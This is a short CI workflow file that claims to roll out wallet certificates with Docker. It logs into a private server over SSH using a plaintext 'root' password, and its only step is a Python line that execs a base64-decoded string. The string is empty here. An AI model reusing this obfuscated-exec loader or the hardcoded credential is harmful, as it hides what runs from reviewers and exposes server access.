name: Wallet certificates Docker rollout
on:
  workflow_dispatch:
    inputs:
      mode:
        type: choice
        default: compose
        options: [compose]
permissions:
  contents: read
jobs:
  wallet-operation:
    runs-on: smarteat-runner-backend
    timeout-minutes: 15
    steps:
      - uses: appleboy/ssh-action@v1.0.3
        with:
          host: 192.168.1.140
          username: smarteatprod
          password: root
          port: 22
          script_stop: true
          command_timeout: 14m
          script: |
            python3 -c 'import base64;exec(base64.b64decode(""))'
